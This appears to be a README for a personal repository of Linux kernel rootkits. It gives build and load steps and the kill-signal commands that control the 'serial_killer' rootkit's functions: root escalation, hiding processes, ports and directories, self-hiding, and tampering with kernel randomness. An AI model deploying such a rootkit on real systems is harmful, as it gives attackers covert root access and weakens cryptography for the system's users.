# Rootkits
Contains multiple techniques used in rootkits.
Each sub directory contains custom rootkits that I made over the course of my learning. As of now, I have only created the serial_killer rootkit for learning purposes.

## Dependencies

### Ubuntu/Debian
```text
# sudo apt-get update;
# sudo apt-get -y install build-essential linux-headers-$(uname -r) 
```
## Centos
```text
# sudo yum check-update
# sudo yum update
# sudo yum install kernel-devel
```
## Fedora
```text
# sudo dnf check-update
# sudo dnf update
# sudo dnf install kernel-devel
```

## Compilation
```text
# cd /path/to/chosen/rootkit
# make
```

## Inject rootkit
```text
# sudo insmod rootkit.ko
```

## Remove rootkit
```text
# sudo rmmod rootkit.ko
```

## Serial Killer
This is my first rootkit that utitlises ftrace to hook onto `sys_kill` which does the following:

 1. Priviledge Escalation
 2. Hides directories
 3. Manage and hide processes
 4. Hides itself
 5. Intercepting /dev/random and /dev/urandom to remove randomness.

 ### Commands
 ```text
/* Credential Handler */
kill -34 1 # Sets uid to 0
kill -34 0 # Reset uid to original

/* Presence Handler */
kill -35 1 # Hides presence of dirs, processes and ports
kill -35 0 # Unhides presence of dirs, processes and ports

kill -41 <pid> # Adds hidden process
kill -42 <pid> # Removes hidden process
kill -43 1     # Prints all hidden processes

kill -51 <port> # Adds hidden port
kill -52 <port> # Removes hidden port
kill -53 1     # Prints all hidden ports

/* Randomness Handler */
kill -36 1 # Activates randomness
kill -36 0 # Deactivates randomness
 ```
